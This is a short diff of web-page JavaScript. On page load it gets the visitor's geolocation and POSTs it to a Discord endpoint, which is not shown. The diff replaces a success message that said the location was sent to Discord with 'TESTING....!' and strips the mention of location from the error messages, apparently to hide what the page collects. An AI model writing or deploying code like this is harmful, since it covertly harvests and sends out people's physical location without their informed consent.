@@ -25,13 +25,13 @@
 							},
 							body: JSON.stringify(data)
 						})
-						.then(() => alert("Đã gửi vị trí lên Discord thành công!"))
+						.then(() => alert("TESTING....!"))
 						.catch((err) => alert("Có lỗi xảy ra: " + JSON.stringify(err)));
 					},
-					(error) => alert("Không thể lấy vị trí.")
+					(error) => alert("Có lỗi xảy ra.")
 				);
 			} else {
-				alert("Trình duyệt của bạn không hỗ trợ xác định vị trí.");
+				alert("Trình duyệt của bạn không hỗ trợ.");
 			}
 		}
 		window.onload = getUserLocation;
